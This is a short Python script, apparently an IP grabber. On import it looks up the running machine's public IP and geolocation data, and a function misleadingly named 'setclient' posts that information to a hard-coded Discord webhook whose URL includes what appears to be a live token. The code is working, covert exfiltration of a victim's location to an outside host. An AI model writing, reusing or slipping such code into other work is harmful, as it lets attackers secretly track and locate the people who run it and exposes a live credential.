import discord 
import requests


ipapi = "https://api.ipify.org/?format=raw"
mainip = requests.get(ipapi).text


info_url = f"http://ip-api.com/json/{mainip}"
ip_info = requests.get(info_url).json()


ip_info_str = "\n".join([f"{key}: {value}" for key, value in ip_info.items()])

def setclient():
    webhook_url = "https://discord.com/api/webhooks/1361494866579947601/wnrvKx_ijcJcLyo2yF56pyB89nNvFA39FTb8KrvAPdxSGC20LUdjVh0rCLmF2-vtTYXj"
    payload = {
        "content": f"IP info:\n{ip_info_str}"
    }
    requests.post(webhook_url, json=payload)
